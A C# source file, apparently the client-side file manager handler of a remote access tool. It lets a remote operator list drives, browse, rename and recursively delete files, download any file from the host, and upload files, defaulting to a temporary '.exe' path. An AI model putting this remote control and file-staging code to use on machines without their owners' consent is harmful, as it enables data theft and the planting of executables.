using Client.Extensions;
using Client.Networking.Packets.FileManager;
using Common.Enums;
using Common.Helper;
using Common.IO;
using Common.Models;
using Common.Utilities;
using System.Collections.Concurrent;
using System.Security;

namespace Client.Networking.Handlers
{
    public class FileManagerHandler : IDisposable
    {
        private readonly Client _client;

        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
        private readonly Semaphore _limitThreads = new Semaphore(4, 4);
        private CancellationTokenSource _tokenSource;
        private CancellationToken _token;

        public FileManagerHandler(Client client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            switch (connected)
            {
                case true:

                    _tokenSource?.Dispose();
                    _tokenSource = new CancellationTokenSource();
                    _token = _tokenSource.Token;
                    break;
                case false:
                    // cancel all running transfers on disconnect
                    _tokenSource.Cancel();
                    break;
            }
        }

        public async Task GetDrives()
        {
            DriveInfo[] driveInfos;
            try
            {
                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                _ = _client.QueuePacketAsync(new StatusFileManager { Message = "GetDrives I/O error", SetLastDirectorySeen = false });
                return;
            }
            catch (UnauthorizedAccessException)
            {
                _ = _client.QueuePacketAsync(new StatusFileManager { Message = "GetDrives No permission", SetLastDirectorySeen = false });
                return;
            }

            if (driveInfos.Length == 0)
            {
                _ = _client.QueuePacketAsync(new StatusFileManager { Message = "GetDrives No drives", SetLastDirectorySeen = false });
                return;
            }

            List<Drive> drives = new();
            for (int i = 0; i < driveInfos.Length; i++)
            {
                try
                {
                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].VolumeLabel,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat)
                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);

                    drives.Add(new Drive
                    {
                        DisplayName = displayName,
                        RootDirectory = driveInfos[i].RootDirectory.FullName
                    });
                }
                catch (Exception)
                {

                }
            }

            _ = _client.QueuePacketAsync(new GetDrivesPacket { Drives = drives });
        }

        public async Task GetDirectory(GetDirectoryPacket packet)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(packet.RemotePath);

                FileInfo[] files = dicInfo.GetFiles();
                DirectoryInfo[] directories = dicInfo.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];

                int offset = 0;
                for (int i = 0; i < directories.Length; i++, offset++)
                {
                    items[i] = new FileSystemEntry
                    {
                        EntryType = FileType.Directory,
                        Name = directories[i].Name,
                        Size = 0,
                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
                    };
                }

                for (int i = 0; i < files.Length; i++)
                {
                    items[i + offset] = new FileSystemEntry
                    {
                        EntryType = FileType.File,
                        Name = files[i].Name,
                        Size = files[i].Length,
                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
                    };
                }

                _ = _client.QueuePacketAsync(new GetDirectoryPacket { RemotePath = packet.RemotePath, Items = items.ToList() });
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory No permission");
            }
            catch (SecurityException)
            {
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory File not found");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O error");
            }
            catch (Exception)
            {
                onError("GetDirectory Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    _ = _client.QueuePacketAsync(new StatusFileManager { Message = statusMessage, SetLastDirectorySeen = true });
            }
        }

        public async Task PathRename(PathRenamePacket packet)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (packet.PathType)
                {
                    case FileType.Directory:
                        Directory.Move(packet.Path, packet.NewPath);
                        _ = _client.QueuePacketAsync(new StatusFileManager
                        {
                            Message = "Renamed directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Move(packet.Path, packet.NewPath);
                        _ = _client.QueuePacketAsync(new StatusFileManager
                        {
                            Message = "Renamed file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                _ = GetDirectory(new GetDirectoryPacket { RemotePath = Path.GetDirectoryName(packet.NewPath) });
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath Path not found");
            }
            catch (IOException)
            {
                onError("RenamePath I/O error");
            }
            catch (Exception)
            {
                onError("RenamePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    _ = _client.QueuePacketAsync(new StatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        public async Task PathDelete(PathDeletePacket packet)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (packet.PathType)
                {
                    case FileType.Directory:
                        Directory.Delete(packet.Path, true);
                        _ = _client.QueuePacketAsync(new StatusFileManager
                        {
                            Message = "Deleted directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Delete(packet.Path);
                        _ = _client.QueuePacketAsync(new StatusFileManager
                        {
                            Message = "Deleted file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                _ = GetDirectory(new GetDirectoryPacket { RemotePath = Path.GetDirectoryName(packet.Path) });
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath Path not found");
            }
            catch (IOException)
            {
                onError("DeletePath I/O error");
            }
            catch (Exception)
            {
                onError("DeletePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    _ = _client.QueuePacketAsync(new StatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        public async Task FileTransferRequest(FileTransferRequestPacket packet)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    using (var srcFile = new FileSplit(packet.RemotePath, FileAccess.Read))
                    {
                        _activeTransfers[packet.IdRequest] = srcFile;
                        foreach (var chunk in srcFile)
                        {
                            if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(packet.IdRequest))
                                break;

                            Thread.Sleep(20);
                            _client.SendPacket(new FileTransferChunkPacket
                            {
                                IdRequest = packet.IdRequest,
                                FilePath = packet.RemotePath,
                                FileSize = srcFile.FileSize,
                                Chunk = chunk
                            });
                        }
                        _client.SendPacket(new FileTransferCompletePacket
                        {
                            IdRequest = packet.IdRequest,
                            FilePath = packet.RemotePath
                        });
                    }
                }
                catch (Exception)
                {
                    _client.SendPacket(new FileTransferCancelPacket
                    {
                        IdRequest = packet.IdRequest,
                        Reason = "Error reading file"
                    });
                }
                finally
                {
                    RemoveFileTransfer(packet.IdRequest);
                    _limitThreads.Release();
                }
            }).Start();
        }

        public async Task FileTransferCancel(FileTransferCancelPacket packet)
        {
            if (_activeTransfers.ContainsKey(packet.IdRequest))
            {
                RemoveFileTransfer(packet.IdRequest);
                _ = _client.QueuePacketAsync(new FileTransferCancelPacket
                {
                    IdRequest = packet.IdRequest,
                    Reason = "Canceled"
                });
            }
        }

        public async Task FileTransferChunk(FileTransferChunkPacket packet)
        {
            try
            {
                if (packet.Chunk.Offset == 0)
                {
                    string filePath = packet.FilePath;

                    if (string.IsNullOrEmpty(filePath))
                    {
                        // generate new temporary file path if empty
                        filePath = FileHelper.GetTempFilePath(".exe");
                    }

                    if (File.Exists(filePath))
                    {
                        // delete existing file
                        NativeMethods.DeleteFile(filePath);
                    }

                    _activeTransfers[packet.IdRequest] = new FileSplit(filePath, FileAccess.Write);
                }

                if (!_activeTransfers.ContainsKey(packet.IdRequest))
                    return;

                var destFile = _activeTransfers[packet.IdRequest];
                destFile.WriteChunk(packet.Chunk);

                if (destFile.FileSize == packet.FileSize)
                {
                    _ = _client.QueuePacketAsync(new FileTransferCompletePacket
                    {
                        IdRequest = packet.IdRequest,
                        FilePath = destFile.FilePath
                    });
                    RemoveFileTransfer(packet.IdRequest);
                }
            }
            catch (Exception)
            {
                RemoveFileTransfer(packet.IdRequest);
                _ = _client.QueuePacketAsync(new FileTransferCancelPacket
                {
                    IdRequest = packet.IdRequest,
                    Reason = "Error writing file"
                });
            }
        }

        private void RemoveFileTransfer(int id)
        {
            if (_activeTransfers.ContainsKey(id))
            {
                _activeTransfers[id]?.Dispose();
                _activeTransfers.TryRemove(id, out _);
            }
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
